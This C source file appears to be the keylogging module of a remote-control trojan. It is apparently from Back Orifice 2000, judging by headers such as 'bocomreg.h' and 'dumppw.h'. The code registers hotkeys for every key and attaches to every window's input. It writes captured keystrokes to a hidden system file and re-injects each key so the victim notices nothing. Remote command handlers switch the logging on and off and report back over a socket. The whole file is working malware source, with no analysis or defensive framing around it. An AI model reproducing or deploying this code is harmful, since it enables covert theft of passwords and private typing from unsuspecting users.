#include<windows.h>
#include<osversion.h>
#include<functions.h>
#include<iohandler.h>
#include<encryption.h>
#include<commandloop.h>
#include<bocomreg.h>
#include<dumppw.h>
#include<cmd\cmd_keylogging.h>

extern HMODULE g_module;

BOOL g_bLogging=FALSE;
HWND g_hwndCap=NULL;
HANDLE g_hCapFile=NULL;
DWORD g_dwKeyCapTID;
HANDLE g_hKeyCapThread;

BOOL CALLBACK EnumWndAtch(HWND hwnd, LPARAM lParam)
{
	if(hwnd!=g_hwndCap) {
		DWORD dwTid,dwPid;

		dwTid=GetWindowThreadProcessId(hwnd,&dwPid);
		AttachThreadInput(dwTid,g_dwKeyCapTID,lParam);
	}

	return TRUE;
}
 

DWORD WINAPI KeyCapThread(LPVOID param)
{
	MSG msg;
	
	g_bLogging=TRUE;

	g_hwndCap=CreateWindowEx(WS_EX_TRANSPARENT,"WSCLAS","",WS_POPUP,0,0,0,0,NULL,NULL,g_module,0);
	if(g_hwndCap==NULL) return -1;

	g_hCapFile=CreateFile((char *)param,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
	if(g_hCapFile==INVALID_HANDLE_VALUE) {
		DestroyWindow(g_hwndCap);
		g_hwndCap=NULL;
		return -1;
	}
	SetFilePointer(g_hCapFile,0,NULL,FILE_END);

	// Do nasty keycaptures
	int alt,vk;
	for(alt=0;alt<16;alt++) {
		for(vk=0x5;vk<=0x5D;vk++) {
			RegisterHotKey(NULL,1000+(alt*0x100)+vk,alt,vk);
		}
	}
	
	// Gimme all the input states
	EnumWindows(EnumWndAtch,TRUE);

	while(g_bLogging) {
		while(PeekMessage(&msg,NULL,0,0,PM_NOREMOVE)) {
			GetMessage(&msg,NULL,0,0);
			if(msg.message==WM_HOTKEY) {
				int nScan,vKey;
				char svBuffer[256];
				DWORD dwBytes,dwCount;
				
				vKey=(UINT)HIWORD(msg.lParam);
				nScan=MapVirtualKey(vKey,0);
				nScan<<=16;

				dwCount=GetKeyNameText(nScan,svBuffer,256);	
				if(dwCount) {
					if(dwCount==1) {
						BYTE kbuf[256];
						WORD ch;
						int chcount;
						
						GetKeyboardState(kbuf);
						
						chcount=ToAscii(vKey,nScan,kbuf,&ch,0);
						if(chcount>0) WriteFile(g_hCapFile,&ch,chcount,&dwBytes,NULL);				
					} else {
						WriteFile(g_hCapFile,"[",1,&dwBytes,NULL);
						WriteFile(g_hCapFile,svBuffer,dwCount,&dwBytes,NULL);
						WriteFile(g_hCapFile,"]",1,&dwBytes,NULL);
						if(vKey==VK_RETURN) WriteFile(g_hCapFile,"\r\n",2,&dwBytes,NULL);
					}
				}

				// Now resimulate
				UnregisterHotKey(NULL,msg.wParam);
				keybd_event((UINT)HIWORD(msg.lParam),nScan,0,0);
				RegisterHotKey(NULL,msg.wParam,(UINT)LOWORD(msg.lParam),(UINT)HIWORD(msg.lParam));
				
			}			
			DispatchMessage(&msg);
		}
		Sleep(0);
	}

	// Unregister nasty keycaptures
	for(alt=0;alt<16;alt++) {
		for(vk=0x5;vk<=0x5D;vk++) {
			UnregisterHotKey(g_hwndCap,1000+(alt*0x100)+vk);
		}
	}

	// Gimme all the input states
	EnumWindows(EnumWndAtch,FALSE);

	DestroyWindow(g_hwndCap);
	g_hwndCap=NULL;
	CloseHandle(g_hCapFile);
	g_hCapFile=NULL;
	g_hKeyCapThread=NULL;


	return 0;
}

int CmdProc_SysLogKeys(CIOSocket *cios_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(g_bLogging==TRUE) {
		IssueCommandReply(cios_from, comid, 0, "Logging is already turned on.\n");
		return -1;
	}

	
	g_hKeyCapThread=CreateThread(NULL,0,KeyCapThread,(LPVOID)svArg2,0,&g_dwKeyCapTID);
	if(g_hKeyCapThread==NULL) {
		IssueCommandReply(cios_from, comid, 0, "Error creating capture thread.\n");
		return -1;
	}
		
	IssueCommandReply(cios_from, comid, 0, "Key logging started.\n");
	return 0;
}

int CmdProc_SysEndKeyLog(CIOSocket *cios_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(g_bLogging==FALSE) {
		IssueCommandReply(cios_from, comid, 0, "Logging is not turned on.\n");
		return 0;
	}
	
	g_bLogging=FALSE;
	if(WaitForSingleObject(g_hKeyCapThread,5000)!=WAIT_OBJECT_0) {
		IssueCommandReply(cios_from,comid,0,"Logging couldn't stop in 5 sec.\n");
		return -1;
	}

	IssueCommandReply(cios_from,comid,0,"Logging stopped successfully.\n");
	return 0;
}
